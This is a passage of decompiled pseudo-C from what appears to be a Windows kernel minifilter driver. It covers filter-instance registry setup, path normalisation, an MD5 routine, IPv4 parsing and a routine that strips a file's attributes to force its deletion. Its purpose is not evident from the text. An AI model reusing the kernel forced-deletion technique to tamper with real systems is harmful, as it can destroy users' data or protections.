                     520,
                     (unsigned int)v14,
                     (unsigned int)L"%wZ\\Instances",
                     (unsigned int)&v13);
              if ( v6 >= 0 )
              {
                v6 = MEMORY[0x6001603000C1902](a4, a3, v14, 1LL);
                if ( v6 >= 0 )
                {
                  v6 = sub_3AFC(
                         (_DWORD)a4,
                         (_DWORD)a3,
                         520,
                         (unsigned int)v15,
                         (unsigned int)L"%wZ Instance",
                         (unsigned int)&v13);
                  if ( v6 >= 0 )
                  {
                    v10 = -1LL;
                    v11 = -1LL;
                    do
                      ++v11;
                    while ( v15[v11] );
                    v6 = MEMORY[0x7010E012F0147218](-1LL, a3, v14, 1LL, L"DefaultInstance", 1LL);
                    if ( v6 >= 0 )
                    {
                      sub_7AF0(-1LL, a3, 0LL, v14, 520LL);
                      v6 = sub_3AFC(
                             -1,
                             (_DWORD)a3,
                             520,
                             (unsigned int)v14,
                             (unsigned int)L"%wZ\\Instances\\%wZ Instance",
                             (unsigned int)&v13);
                      if ( v6 >= 0 )
                      {
                        v6 = MEMORY[0x6001603000C1902](-1LL, a3, v14, 1LL);
                        if ( v6 >= 0 )
                        {
                          do
                            ++v10;
                          while ( a3[v10] );
                          v6 = MEMORY[0x7010E012F0147218](v10, a3, v14, 1LL, L"Altitude", 1LL);
                          if ( v6 >= 0 )
                            return (unsigned int)MEMORY[0x7010E012F0147218](v10, a3, v14, 1LL, L"Flags");
                        }
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
  return (unsigned int)v6;
}


// Function: sub_3AFC at 0x3AFC
__int64 __fastcall sub_3AFC(
        _DWORD a1,
        _DWORD a2,
        unsigned __int64 a3,
        _WORD *a4,
        __int64 a5,
        __int64 a6,
        __int64 a7,
        __int64 a8,
        __int64 a9,
        __int64 a10)
{
  unsigned __int64 v10; // rdx
  unsigned int v12; // edi
  unsigned __int64 v13; // rsi
  int v14; // eax

  a10 = a6;
  v10 = a3 >> 1;
  if ( v10 - 1 <= 0x7FFFFFFE )
  {
    v13 = v10 - 1;
    v12 = 0;
    v14 = sub_7600(0LL, v10 - 1, v10 - 1, a4, a5, &a10);
    if ( v14 < 0 || v14 > v13 )
    {
      v12 = -2147483643;
    }
    else if ( v14 != v13 )
    {
      return v12;
    }
    a4[v13] = 0;
    return v12;
  }
  v12 = -1073741811;
  if ( v10 )
    *a4 = 0;
  return v12;
}


// Function: sub_3B6C at 0x3B6C
bool __fastcall sub_3B6C(__int64 a1, __int64 a2, _DWORD a3, __int64 a4)
{
  return (unsigned int)MEMORY[0xA2011E00A4341E](a1, a2, 0LL, a4, 0LL, 0LL) == 0;
}


// Function: sub_3B98 at 0x3B98
void sub_3B98()
{
  JUMPOUT(0x13640F06530602LL);
}


// Function: sub_3BA4 at 0x3BA4
__int64 __fastcall sub_3BA4(__int64 a1, __int64 a2, _DWORD a3, __int64 a4, _DWORD a5, _DWORD a6, __int64 a7)
{
  a7 = -10000 * a4;
  return MEMORY[0x600160100030402](a1, a2, 0LL, 0LL, &a7);
}


// Function: sub_3BC8 at 0x3BC8
__int64 __fastcall sub_3BC8(_DWORD a1, _DWORD a2, unsigned __int16 *a3, unsigned __int16 *a4)
{
  __int64 v6; // r8
  __int64 v7; // r8
  unsigned int v8; // ebx
  int v9; // edx
  char *v10; // r10
  unsigned __int16 v11; // ax
  unsigned __int16 v12; // cx
  __int64 result; // rax
  int v14; // r14d
  __int64 v15; // rdx
  int v16; // edx
  int *v17; // rdx
  char v18; // al
  __int64 v19; // r8
  int v20; // r8d
  int v21; // r9d
  char *v22; // r8
  int v23; // r9d
  __int16 v24; // dx
  unsigned __int64 v25; // rcx
  __int16 v26; // ax
  int v27; // eax
  int v28; // [rsp+20h] [rbp-E0h] BYREF
  char *v29; // [rsp+28h] [rbp-D8h]
  __int64 v30; // [rsp+30h] [rbp-D0h] BYREF
  __int64 v31; // [rsp+38h] [rbp-C8h]
  unsigned __int16 v32; // [rsp+40h] [rbp-C0h] BYREF
  __int64 v33; // [rsp+48h] [rbp-B8h]
  _WORD v34[4]; // [rsp+50h] [rbp-B0h] BYREF
  char *v35; // [rsp+58h] [rbp-A8h]
  _BYTE v36[8]; // [rsp+60h] [rbp-A0h] BYREF
  _WORD v37[8]; // [rsp+68h] [rbp-98h] BYREF
  _BYTE v38[16]; // [rsp+78h] [rbp-88h] BYREF
  int v39; // [rsp+88h] [rbp-78h] BYREF
  __int64 v40; // [rsp+90h] [rbp-70h]
  int *v41; // [rsp+98h] [rbp-68h]
  int v42; // [rsp+A0h] [rbp-60h]
  __int128 v43; // [rsp+A8h] [rbp-58h]
  char v44; // [rsp+C0h] [rbp-40h] BYREF

  MEMORY[0x5002300360047005](a3, a4, L"\\??\\", v37);
  MEMORY[0x5002300360047005](a3, a4, L"\\Device\\", v38);
  MEMORY[0x5002300360047005](a3, a4, L"\\SystemRoot\\", &v32);
  LOBYTE(v6) = 1;
  v8 = 0;
  if ( (unsigned __int8)MEMORY[0x655060100060A02](a3, a4, a4, v37, v6) )
  {
    v9 = 0;
    v10 = (char *)*((_QWORD *)a4 + 1);
    v11 = *a4 - v37[0];
    v12 = v11;
    LOWORD(v28) = v11;
    v29 = &v10[v37[0]];
    if ( v11 )
    {
      while ( *(_WORD *)&v10[2 * v9 + v37[0]] != 92 )
      {
        if ( ++v9 >= (unsigned int)v11 )
          goto LABEL_7;
      }
      v12 = 2 * v9;
    }
LABEL_7:
    if ( !v12 )
      return 3221225711LL;
    v29 = v10;
    LOWORD(v28) = v37[0] + v12;
    HIWORD(v28) = v37[0] + v12;
    v39 = 48;
    v40 = 0LL;
    v42 = 512;
    v41 = &v28;
    v43 = 0LL;
    result = MEMORY[0xA3418000B5418](a3, a4, 0x80000000LL, &v30, &v39);
    if ( (int)result >= 0 )
    {
      v14 = MEMORY[0x7010E012F0145218](a3, a4, a3, v30, v36);
      MEMORY[0x6B6422006C7422](a3, a4, v15, v30);
      if ( v14 < 0 )
        return (unsigned int)v14;
      v16 = *a4;
      if ( v16 + *a3 - (unsigned int)(unsigned __int16)v28 > a3[1] )
        return 2147483653LL;
      v29 = (char *)(*((_QWORD *)a4 + 1) + (unsigned __int16)v28);
      LOWORD(v28) = v16 - v28;
      HIWORD(v28) = v28;
      v17 = &v28;
      goto LABEL_15;
    }
  }
  else
  {
    LOBYTE(v7) = 1;
    v18 = MEMORY[0x655060100060A02](a3, a4, a4, v38, v7);
    v17 = (int *)a4;
    if ( v18 )
    {
      *a3 = 0;
LABEL_15:
      result = MEMORY[0x8341900095419](a3, a4, v17, a3);
      if ( (int)result >= 0 )
        return 0LL;
      return result;
    }
    LOBYTE(v19) = 1;
    if ( (unsigned __int8)MEMORY[0x655060100060A02](a3, a4, a4, &v32, v19) )
    {
      v31 = v33;
      v28 = 0x800000;
      LOWORD(v30) = v32 - 2;
      WORD1(v30) = v32 - 2;
      v29 = &v44;
      result = sub_4184((_DWORD)a3, (_DWORD)a4, (unsigned int)&v28, (unsigned int)&v30, v20, v21);
      if ( (int)result >= 0 )
      {
        v24 = v28;
        v34[0] = 0;
        v25 = ((unsigned __int64)(unsigned __int16)v28 - 2) >> 1;
        if ( (v25 & 0x8000u) == 0LL )
        {
          v23 = (int)v29;
          while ( 1 )
          {
            v22 = &v29[2 * (unsigned __int16)v25];
            if ( *(_WORD *)v22 == 92 )
              break;
            LOWORD(v25) = v25 - 1;
            if ( (v25 & 0x8000u) != 0LL )
              goto LABEL_27;
          }
          v35 = &v29[2 * (unsigned __int16)v25];
          LOWORD(v28) = 2 * v25;
          v34[0] = v24 - 2 * v25;
          v34[1] = v34[0];
        }
LABEL_27:
        result = sub_4184((_DWORD)a3, (_DWORD)a4, (_DWORD)a3, (unsigned int)&v28, (_DWORD)v22, v23);
        if ( (int)result >= 0 )
        {
          v26 = *a4 - v32 + 2;
          v31 = *((_QWORD *)a4 + 1) + v32 - 2LL;
          LOWORD(v30) = v26;
          WORD1(v30) = v26;
          result = MEMORY[0x8341900095419](a3, a4, v34, a3);
          if ( (int)result >= 0 )
          {
            v27 = MEMORY[0x8341900095419](a3, a4, &v30, a3);
            if ( v27 < 0 )
              return (unsigned int)v27;
            return v8;
          }
        }
      }
    }
    else
    {
      return 3221225485LL;
    }
  }
  return result;
}


// Function: sub_3EC0 at 0x3EC0
__int64 __fastcall sub_3EC0(__int64 a1, __int64 a2, _DWORD a3, __int128 *a4)
{
  __int128 v4; // xmm0
  __int64 result; // rax
  __int64 v6; // rdx
  unsigned int v7; // ebx
  __int64 v8; // rdx
  char v9[8]; // [rsp+60h] [rbp-39h] BYREF
  __int64 v10; // [rsp+68h] [rbp-31h] BYREF
  _BYTE v11[16]; // [rsp+70h] [rbp-29h] BYREF
  int v12; // [rsp+80h] [rbp-19h] BYREF
  __int64 v13; // [rsp+88h] [rbp-11h]
  __int128 *v14; // [rsp+90h] [rbp-9h]
  int v15; // [rsp+98h] [rbp-1h]
  __int128 v16; // [rsp+A0h] [rbp+7h]
  __int128 v17; // [rsp+B0h] [rbp+17h] BYREF
  _OWORD v18[2]; // [rsp+C0h] [rbp+27h] BYREF
  __int64 v19; // [rsp+E0h] [rbp+47h]

  v4 = *a4;
  v13 = 0LL;
  v17 = v4;
  v12 = 48;
  v16 = 0LL;
  v15 = 576;
  v14 = &v17;
  result = MEMORY[0x6341900075419](a1, a2, 1114114LL, &v10, &v12, v11);
  if ( (int)result >= 0 )
    goto LABEL_5;
  if ( (_DWORD)result == -1073741790 )
  {
    result = MEMORY[0x6341900075419](a1, a2, 1048960LL, &v10, &v12, v11);
    if ( (int)result >= 0 )
    {
      v19 = 0LL;
      memset(v18, 0, sizeof(v18));
      MEMORY[0xC1802E0155219](a1, a2, v11, v10, v18, 40LL);
      LODWORD(v19) = 128;
      MEMORY[0xC641806001606](a1, a2, v11, v10, v18, 40LL);
      MEMORY[0x6B6422006C7422](a1, a2, v6, v10);
      result = MEMORY[0x6341900075419](a1, a2, 1114114LL, &v10, &v12, v11);
      if ( (int)result >= 0 )
      {
LABEL_5:
        v9[0] = 1;
        v7 = MEMORY[0xC641806001606](a1, a2, v11, v10, v9, 1LL);
        MEMORY[0x6B6422006C7422](a1, a2, v8, v10);
        return v7;
      }
    }
  }
  return result;
}


// Function: sub_40B4 at 0x40B4
__int64 __fastcall sub_40B4(
        __int64 a1,
        _DWORD a2,
        __int64 *a3,
        __int64 a4,
        _QWORD *a5,
        _DWORD a6,
        __int64 a7,
        __int64 a8,
        __int64 a9,
        unsigned int a10)
{
  __int64 v12; // rbx
  unsigned int v13; // ebp
  __int64 result; // rax
  unsigned int v15; // eax
  __int64 v16; // rax
  int v17; // eax
  __int64 v18; // rax
  int v19[10]; // [rsp+20h] [rbp-28h] BYREF

  v12 = 0LL;
  a10 = 0;
  v19[0] = 0;
  v13 = a4;
  result = MEMORY[0x134050002740A](a1, a5, 0LL, a4, 0LL, &a10);
  if ( (_DWORD)result == -1073741820 )
  {
    do
    {
      v15 = v19[0] + a10;
      a10 += v19[0];
      if ( v12 )
      {
        MEMORY[0x13640F06530602](a1, a5, 1919970376LL, v12);
        v15 = a10;
      }
      v16 = MEMORY[0x81E1A50023003](a1, a5, v15, 0LL, 1919970376LL);
      v12 = v16;
      if ( !v16 )
        return 3221225506LL;
      v17 = MEMORY[0x134050002740A](a1, a5, v16, v13, a10, v19);
      a1 = (unsigned int)v17;
    }
    while ( v17 == -1073741820 );
    if ( v17 >= 0 )
    {
      v18 = a10;
      *a3 = v12;
      *a5 = v18;
    }
    else
    {
      MEMORY[0x13640F06530602]((unsigned int)v17, a5, 1919970376LL, v12);
    }
    return (unsigned int)a1;
  }
  return result;
}


// Function: sub_4184 at 0x4184
__int64 __fastcall sub_4184(
        __int64 a1,
        __int64 a2,
        __int64 a3,
        __int64 a4,
        _DWORD a5,
        _DWORD a6,
        char a7,
        __int64 a8,
        __int64 a9)
{
  __int64 result; // rax
  unsigned int v11; // ebx
  __int64 v12; // rdx
  int v13; // [rsp+20h] [rbp-38h] BYREF
  __int64 v14; // [rsp+28h] [rbp-30h]
  __int64 v15; // [rsp+30h] [rbp-28h]
  int v16; // [rsp+38h] [rbp-20h]
  __int128 v17; // [rsp+40h] [rbp-18h]

  v14 = 0LL;
  v15 = a4;
  v13 = 48;
  v16 = 512;
  v17 = 0LL;
  result = MEMORY[0xA3418000B5418](a1, a2, 0x80000000LL, &a9, &v13);
  if ( (int)result >= 0 )
  {
    v11 = MEMORY[0x7010E012F0145218](a1, a2, a3, a9, &a7);
    MEMORY[0x6B6422006C7422](a1, a2, v12, a9);
    return v11;
  }
  return result;
}


// Function: sub_41F0 at 0x41F0
__int64 __fastcall sub_41F0(__int64 a1, __int64 a2, __int64 a3, __int64 a4, __int64 a5, __int64 a6, int a7, int a8)
{
  unsigned int v8; // ebx

  v8 = 0;
  a8 = 0;
  if ( (unsigned int)sub_7616(a1, a2, L"%hhu.%hhu.%hhu.%hhu", a4, &a8, (char *)&a8 + 1) == 4 )
    return (unsigned __int8)a8 | ((BYTE1(a8) | (HIWORD(a8) << 8)) << 8);
  return v8;
}


// Function: sub_4254 at 0x4254
__int64 __fastcall sub_4254(int a1, int a2, int a3, int a4, int a5, int a6)
{
  int v7; // r8d
  int v8; // r9d
  __int64 result; // rax
  _BYTE *v10; // rcx
  _DWORD v11[56]; // [rsp+20h] [rbp-F8h] BYREF

  v11[0] = 0;
  v11[1] = 0;
  v11[2] = 1732584193;
  v11[3] = -271733879;
  v11[4] = -1732584194;
  v11[5] = 271733878;
  sub_4E78(a1, a2, a4, (unsigned int)v11, a3, a6);
  sub_4330(a1, a2, a5, (unsigned int)v11, v7, v8);
  result = 216LL;
  v10 = v11;
  do
  {
    *v10++ = 0;
    --result;
  }
  while ( result );
  return result;
}


// Function: sub_42E8 at 0x42E8
__int64 __fastcall sub_42E8(__int64 a1, __int64 a2, int a3, int a4, __int64 a5, int a6)
{
  _BYTE v8[16]; // [rsp+20h] [rbp-28h] BYREF

  sub_4254(a1, a2, a3, a4, (int)v8, a6);
  return sub_7630(a1, a2, a5, v8, 16LL);
}


// Function: sub_4330 at 0x4330
char __fastcall sub_4330(_DWORD a1, int a2, __int64 a3, int *a4)
{
  int v4; // r10d
  unsigned int v7; // r9d
  int v8; // r8d
  __int16 v9; // ax
  unsigned int v10; // r10d
  unsigned int v11; // r8d
  unsigned int v12; // eax
  unsigned int v13; // r9d
  int v14; // r9d
  char result; // al
  _BYTE v16[4]; // [rsp+20h] [rbp-18h] BYREF
  __int16 v17; // [rsp+24h] [rbp-14h]
  char v18; // [rsp+26h] [rbp-12h]
  char v19; // [rsp+27h] [rbp-11h]

  v4 = *a4;
  v7 = *(__int64 *)a4 >> 29;
  v8 = 8 * *a4;
  v16[0] = 8 * *a4;
  v9 = 8 * v4;
  v10 = v4 & 0x3F;
  v16[1] = HIBYTE(v9);
  v16[2] = BYTE2(v8);
  v16[3] = HIBYTE(v8);
  v11 = 120 - v10;
  v17 = v7;
  v12 = HIWORD(v7);
  v13 = HIBYTE(v7);
  v18 = v12;
  v19 = v13;
  if ( v10 < 0x38 )
    v11 = 56 - v10;
  sub_4E78(a3, a2, (unsigned int)&unk_91E0, (_DWORD)a4, v11, v13);
  sub_4E78(a3, a2, (unsigned int)v16, (_DWORD)a4, 8, v14);
  *(_WORD *)a3 = __PAIR16__(BYTE1(a4[2]), *((_BYTE *)a4 + 8));
  *(_BYTE *)(a3 + 2) = *((_BYTE *)a4 + 10);
  *(_BYTE *)(a3 + 3) = *((_BYTE *)a4 + 11);
  *(_WORD *)(a3 + 4) = __PAIR16__(BYTE1(a4[3]), *((_BYTE *)a4 + 12));
  *(_BYTE *)(a3 + 6) = *((_BYTE *)a4 + 14);
  *(_BYTE *)(a3 + 7) = *((_BYTE *)a4 + 15);
  *(_WORD *)(a3 + 8) = __PAIR16__(BYTE1(a4[4]), *((_BYTE *)a4 + 16));
  *(_BYTE *)(a3 + 10) = *((_BYTE *)a4 + 18);
  *(_BYTE *)(a3 + 11) = *((_BYTE *)a4 + 19);
  *(_WORD *)(a3 + 12) = __PAIR16__(BYTE1(a4[5]), *((_BYTE *)a4 + 20));
  *(_BYTE *)(a3 + 14) = *((_BYTE *)a4 + 22);
  result = *((_BYTE *)a4 + 23);
  *(_BYTE *)(a3 + 15) = result;
  return result;
}


// Function: sub_4470 at 0x4470
__int64 __fastcall sub_4470(__int64 a1, __int64 a2, unsigned __int8 *a3, _DWORD *a4)
{
  int v4; // ebp
  int v5; // r14d
  int v6; // edi
  int v7; // r12d
  int v8; // ebx
  int v9; // r13d
  int v10; // r15d
  int v11; // esi
  int v12; // ecx
  int v13; // edx
  int v14; // r8d
  int v15; // r9d
  int v16; // r10d
  int v17; // ecx
  int v18; // edx
  int v19; // r8d
  int v20; // r9d
  int v21; // r10d
  int v22; // ecx
  int v23; // edx
  int v24; // r8d
  int v25; // r9d
  int v26; // r10d
  int v27; // ecx
  int v28; // edx
  int v29; // r8d
  int v30; // r9d
  int v31; // r10d
  int v32; // ecx
  int v33; // edx
  int v34; // r8d
  int v35; // r9d
  int v36; // r10d
  int v37; // ecx
  int v38; // edx
  int v39; // r11d
  int v40; // r8d
  int v41; // r9d
  int v42; // r10d
  int v43; // edx
  int v44; // r8d
  int v45; // r9d
  int v46; // r10d
  int v47; // r11d
  int v48; // edx
  int v49; // r8d
  int v50; // r9d
  int v51; // r10d
  int v52; // r11d
  int v53; // r8d
  int v54; // r9d
  int v55; // edx
  int v56; // r10d
  int v57; // ecx
  int v58; // r8d
  int v59; // r9d
  int v60; // edx
  int v61; // r10d
  int v62; // ecx
  int v63; // r8d
  int v64; // r9d
  int v65; // edx
  int v66; // r10d
  int v67; // ecx
  int v68; // r8d
  int v69; // r9d
  int v70; // r11d
  int v71; // r10d
  int v72; // r8d
  int v73; // edx
  int v74; // ecx
  __int64 result; // rax
  int v76; // [rsp+0h] [rbp-78h]
  int v77; // [rsp+4h] [rbp-74h]
  int v78; // [rsp+8h] [rbp-70h]
  int v79; // [rsp+Ch] [rbp-6Ch]
  int v80; // [rsp+10h] [rbp-68h]
  int v81; // [rsp+14h] [rbp-64h]
  int v82; // [rsp+18h] [rbp-60h]
  int v83; // [rsp+1Ch] [rbp-5Ch]
  int v84; // [rsp+20h] [rbp-58h]
  int v88; // [rsp+88h] [rbp+10h]
  int v90; // [rsp+90h] [rbp+18h]
  int v92; // [rsp+98h] [rbp+20h]

  v80 = *a3 | ((a3[1] | (*((unsigned __int16 *)a3 + 1) << 8)) << 8);
  v88 = a3[4] | ((a3[5] | (*((unsigned __int16 *)a3 + 3) << 8)) << 8);
  v78 = a3[8] | ((a3[9] | ((a3[10] | (a3[11] << 8)) << 8)) << 8);
  v81 = a3[12] | ((a3[13] | (*((unsigned __int16 *)a3 + 7) << 8)) << 8);
  v76 = a3[16] | ((a3[17] | (*((unsigned __int16 *)a3 + 9) << 8)) << 8);
  v82 = a3[20] | ((a3[21] | (*((unsigned __int16 *)a3 + 11) << 8)) << 8);
  v92 = a3[24] | ((a3[25] | (*((unsigned __int16 *)a3 + 13) << 8)) << 8);
  v4 = a3[28] | ((a3[29] | ((a3[30] | (a3[31] << 8)) << 8)) << 8);
  v90 = a3[32] | ((a3[33] | (*((unsigned __int16 *)a3 + 17) << 8)) << 8);
  v79 = a3[36] | ((a3[37] | ((a3[38] | (a3[39] << 8)) << 8)) << 8);
  v5 = a3[40] | ((a3[41] | (*((unsigned __int16 *)a3 + 21) << 8)) << 8);
  v77 = a3[44] | ((a3[45] | (*((unsigned __int16 *)a3 + 23) << 8)) << 8);
  v6 = a3[48] | ((a3[49] | (*((unsigned __int16 *)a3 + 25) << 8)) << 8);
  v7 = a3[52] | ((a3[53] | ((a3[54] | (a3[55] << 8)) << 8)) << 8);
  v8 = a3[56] | ((a3[57] | ((a3[58] | (a3[59] << 8)) << 8)) << 8);
  v9 = a4[3];
  v83 = a4[4];
  v10 = a4[2];
  v84 = a4[5];
  v11 = a3[60] | ((a3[61] | (*((unsigned __int16 *)a3 + 31) << 8)) << 8);
  v12 = v9 + __ROR4__(v10 + (v84 ^ v9 & (v83 ^ v84)) + v80 - 680876936, 25);
  v13 = v12 + __ROR4__(v88 + (v83 ^ v12 & (v9 ^ v83)) + v84 - 389564586, 20);
  v14 = v13 + __ROR4__(v78 + (v9 ^ v13 & (v12 ^ v9)) + v83 + 606105819, 15);
  v15 = v14 + __ROR4__(v81 + (v12 ^ v14 & (v12 ^ v13)) + v9 - 1044525330, 10);
  v16 = v15 + __ROR4__(v76 + (v13 ^ v15 & (v14 ^ v13)) + v12 - 176418897, 25);
  v17 = v16 + __ROR4__(v82 + (v14 ^ v16 & (v15 ^ v14)) + v13 + 1200080426, 20);
  v18 = v17 + __ROR4__(v92 + (v15 ^ v17 & (v16 ^ v15)) + v14 - 1473231341, 15);
  v19 = v18 + __ROR4__(v4 + (v16 ^ v18 & (v16 ^ v17)) + v15 - 45705983, 10);
  v20 = v19 + __ROR4__(v90 + (v17 ^ v19 & (v18 ^ v17)) + v16 + 1770035416, 25);
  v21 = v20 + __ROR4__(v79 + (v18 ^ v20 & (v19 ^ v18)) + v17 - 1958414417, 20);
  v22 = v21 + __ROR4__(v5 + (v19 ^ v21 & (v20 ^ v19)) + v18 - 42063, 15);
  v23 = v22 + __ROR4__(v77 + (v20 ^ v22 & (v20 ^ v21)) + v19 - 1990404162, 10);
  v24 = v23 + __ROR4__(v6 + (v21 ^ v23 & (v22 ^ v21)) + v20 + 1804603682, 25);
  v25 = v24 + __ROR4__(v7 + (v22 ^ v24 & (v23 ^ v22)) + v21 - 40341101, 20);
  v26 = v25 + __ROR4__(v8 + (v23 ^ v25 & (v24 ^ v23)) + v22 - 1502002290, 15);
  v27 = v26 + __ROR4__(v11 + (v24 ^ v26 & (v24 ^ v25)) + v23 + 1236535329, 10);
  v28 = v27 + __ROR4__(v88 + (v26 ^ v25 & (v27 ^ v26)) + v24 - 165796510, 27);
  v29 = v28 + __ROR4__(v92 + (v27 ^ v26 & (v28 ^ v27)) + v25 - 1069501632, 23);
  v30 = v29 + __ROR4__(v77 + (v28 ^ v27 & (v28 ^ v29)) + v26 + 643717713, 18);
  v31 = v30 + __ROR4__(v80 + (v29 ^ v28 & (v30 ^ v29)) + v27 - 373897302, 12);
  v32 = v31 + __ROR4__(v82 + (v30 ^ v29 & (v31 ^ v30)) + v28 - 701558691, 27);
  v33 = v32 + __ROR4__(v5 + (v31 ^ v30 & (v32 ^ v31)) + v29 + 38016083, 23);
  v34 = v33 + __ROR4__(v11 + (v32 ^ v31 & (v32 ^ v33)) + v30 - 660478335, 18);
  v35 = v34 + __ROR4__(v76 + (v33 ^ v32 & (v34 ^ v33)) + v31 - 405537848, 12);
  v36 = v35 + __ROR4__(v79 + (v34 ^ v33 & (v35 ^ v34)) + v32 + 568446438, 27);
  v37 = v36 + __ROR4__(v8 + (v35 ^ v34 & (v36 ^ v35)) + v33 - 1019803690, 23);
  v38 = v37 + __ROR4__(v81 + (v36 ^ v35 & (v36 ^ v37)) + v34 - 187363961, 18);
  v39 = v38 + __ROR4__(v90 + (v37 ^ v36 & (v38 ^ v37)) + v35 + 1163531501, 12);
  v40 = v39 + __ROR4__(v7 + (v38 ^ v37 & (v39 ^ v38)) + v36 - 1444681467, 27);
  v41 = v40 + __ROR4__(v78 + (v39 ^ v38 & (v40 ^ v39)) + v37 - 51403784, 23);
  v42 = v41 + __ROR4__(v4 + (v40 ^ v39 & (v40 ^ v41)) + v38 + 1735328473, 18);
  v43 = v42 + __ROR4__(v6 + (v41 ^ v40 & (v42 ^ v41)) + v39 - 1926607734, 12);
  v44 = v43 + __ROR4__(v82 + (v43 ^ v42 ^ v41) - 378558 + v40, 28);
  v45 = v44 + __ROR4__(v90 + (v44 ^ v43 ^ v42) - 2022574463 + v41, 21);
  v46 = v45 + __ROR4__(v77 + (v44 ^ v43 ^ v45) + 1839030562 + v42, 16);
  v47 = v46 + __ROR4__(v8 + (v44 ^ v46 ^ v45) + v43 - 35309556, 9);
  v48 = v47 + __ROR4__(v88 + (v47 ^ v46 ^ v45) + v44 - 1530992060, 28);
  v49 = v48 + __ROR4__(v76 + (v48 ^ v47 ^ v46) + v45 + 1272893353, 21);
  v50 = v49 + __ROR4__(v4 + (v48 ^ v47 ^ v49) + v46 - 155497632, 16);
  v51 = v50 + __ROR4__(v5 + (v48 ^ v50 ^ v49) + v47 - 1094730640, 9);
  v52 = v51 + __ROR4__(v7 + (v51 ^ v50 ^ v49) + v48 + 681279174, 28);
  v53 = v52 + __ROR4__(v80 + (v52 ^ v51 ^ v50) - 358537222 + v49, 21);
  v54 = v53 + __ROR4__(v81 + (v52 ^ v51 ^ v53) - 722521979 + v50, 16);
  v55 = v54 + __ROR4__(v92 + (v52 ^ v54 ^ v53) + v51 + 76029189, 9);
  v56 = v55 + __ROR4__(v52 + v79 + (v55 ^ v54 ^ v53) - 640364487, 28);
  v57 = v56 + __ROR4__(v6 + (v56 ^ v55 ^ v54) + v53 - 421815835, 21);
  v58 = v57 + __ROR4__(v11 + (v56 ^ v55 ^ v57) + v54 + 530742520, 16);
  v59 = v58 + __ROR4__(v78 + (v56 ^ v58 ^ v57) + v55 - 995338651, 9);
  v60 = v59 + __ROR4__(v80 + (v58 ^ (v59 | ~v57)) + v56 - 198630844, 26);
  v61 = v60 + __ROR4__(v4 + (v59 ^ (v60 | ~v58)) + v57 + 1126891415, 22);
  v62 = v61 + __ROR4__(v8 + (v60 ^ (v61 | ~v59)) + v58 - 1416354905, 17);
  v63 = v62 + __ROR4__(v82 + (v61 ^ (v62 | ~v60)) + v59 - 57434055, 11);
  v64 = v63 + __ROR4__(v6 + (v62 ^ (v63 | ~v61)) + v60 + 1700485571, 26);
  v65 = v64 + __ROR4__(v81 + (v63 ^ (v64 | ~v62)) + v61 - 1894986606, 22);
  v66 = v65 + __ROR4__(v5 + (v64 ^ (v65 | ~v63)) + v62 - 1051523, 17);
  v67 = v66 + __ROR4__(v88 + (v65 ^ (v66 | ~v64)) + v63 - 2054922799, 11);
  v68 = v67 + __ROR4__(v90 + (v66 ^ (v67 | ~v65)) + v64 + 1873313359, 26);
  v69 = v68 + __ROR4__(v65 + v11 + (v67 ^ (v68 | ~v66)) - 30611744, 22);
  v70 = v69 + __ROR4__(v92 + (v68 ^ (v69 | ~v67)) + v66 - 1560198380, 17);
  v71 = v70 + __ROR4__(v7 + (v69 ^ (v70 | ~v68)) + v67 + 1309151649, 11);
  v72 = v71 + __ROR4__(v76 + (v70 ^ (v71 | ~v69)) - 145523070 + v68, 26);
  v73 = v72 + __ROR4__(v77 + (v71 ^ (v72 | ~v70)) + v69 - 1120210379, 22);
  a4[2] = v10 + v72;
  v74 = v73 + __ROR4__(v70 + v78 + (v72 ^ (v73 | ~v71)) + 718787259, 17);
  a4[3] = v74 + v9 + __ROR4__(v79 + (v73 ^ (v74 | ~v72)) + v71 - 343485551, 11);
  a4[4] = v74 + v83;
  result = (unsigned int)(v73 + v84);
  a4[5] = result;
  return result;
}


// Function: sub_4E78 at 0x4E78
__int64 __fastcall sub_4E78(_DWORD a1, _DWORD a2, unsigned __int8 *a3, __int64 a4, unsigned __int64 a5)
{
  unsigned __int64 v5; // rbx
  unsigned int v6; // r14d
  unsigned __int8 *v7; // rbp
  unsigned __int64 v8; // rsi
  __int64 result; // rax

  if ( a5 )
  {
    v5 = a5;
    v6 = *(_DWORD *)a4 & 0x3F;
    v7 = a3;
    v8 = 64 - v6;
    result = (unsigned int)(a5 + *(_DWORD *)a4);
    *(_DWORD *)a4 = result;
    if ( (unsigned int)result < (unsigned int)a5 )
      ++*(_DWORD *)(a4 + 4);
    if ( v6 && a5 >= v8 )
    {
      sub_7830(a4, v8, a3, a4 + v6 + 24LL, 64 - v6);
      result = sub_4470(a4, v8, (unsigned __int8 *)(a4 + 24), (_DWORD *)a4);
      v7 += v8;
      v5 -= v8;
      v6 = 0;
    }
    if ( v5 >= 0x40 )
    {
      v8 = v5 >> 6;
      v5 += -64LL * (v5 >> 6);
      do
      {
        result = sub_4470(a4, v8, v7, (_DWORD *)a4);
        v7 += 64;
        --v8;
      }
      while ( v8 );
    }
    if ( v5 )
      return sub_7830(a4, v8, v7, a4 + v6 + 24LL, v5);
  }
  return result;
}


// Function: sub_4F54 at 0x4F54
__int64 __fastcall sub_4F54(__int64 a1, int a2, int a3, int a4, int a5, int a6)
{
  int v8; // r9d
  __int64 v10; // [rsp+0h] [rbp-28h]
  __int64 v11; // [rsp+8h] [rbp-20h]
  __int64 v12; // [rsp+10h] [rbp-18h]

  if ( (unsigned __int8)sub_506C(a3, a2, a4, (unsigned int)&qword_A110, a5, a6) )
    return 3221227288LL;
  else
    return sub_4F9C(a3, a2, a4, (unsigned int)&qword_A110, a3, v8, v10, v11, v12);
}


// Function: sub_4F9C at 0x4F9C
__int64 __fastcall sub_4F9C(_DWORD a1, _DWORD a2, __int64 a3, __int64 a4, _DWORD *a5)
{
  _OWORD *v9; // rax
  __int64 v10; // rdx
  _OWORD *v11; // rbx
  __int64 v12; // rdx
  _QWORD *v13; // rax

  if ( !*(_DWORD *)a3 && !*(_WORD *)(a3 + 4) )
    return 3221225485LL;
  v9 = (_OWORD *)MEMORY[0x81E1A50023003](a4, a3, 32LL, 0LL, 1162433358LL);
  v11 = v9;
  if ( !v9 )
    return 3221225626LL;
  *v9 = 0LL;
  v9[1] = 0LL;
  MEMORY[0x6001606000E2202](a4, a3, v10, a4 + 16);
  *((_DWORD *)v11 + 4) = (*(_DWORD *)(a4 + 72))++;
  *(_QWORD *)((char *)v11 + 20) = *(_QWORD *)a3;
  v13 = *(_QWORD **)(a4 + 8);
  if ( *v13 != a4 )
    __fastfail(3u);
  *(_QWORD *)v11 = a4;
